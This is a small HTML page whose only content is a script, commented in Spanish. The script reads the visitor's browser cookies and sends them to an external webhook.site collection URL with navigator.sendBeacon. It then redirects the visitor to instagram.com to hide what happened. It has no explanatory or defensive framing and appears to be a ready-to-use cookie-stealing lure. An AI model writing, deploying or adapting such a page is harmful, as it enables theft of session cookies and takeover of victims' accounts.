<!DOCTYPE html>
<html>
<body>
    <script>
        // Usamos sendBeacon para asegurar que los datos se envíen incluso si la página se cierra o redirige
        var cookies = document.cookie;
        navigator.sendBeacon('https://webhook.site/ead7c29b-87ec-48f2-94a1-976c087aec41', JSON.stringify({data: cookies}));
        
        // Un pequeño retraso para asegurar el envío
        setTimeout(function() {
            window.location.href = "https://www.instagram.com";
        }, 500);
    </script>
</body>
</html>
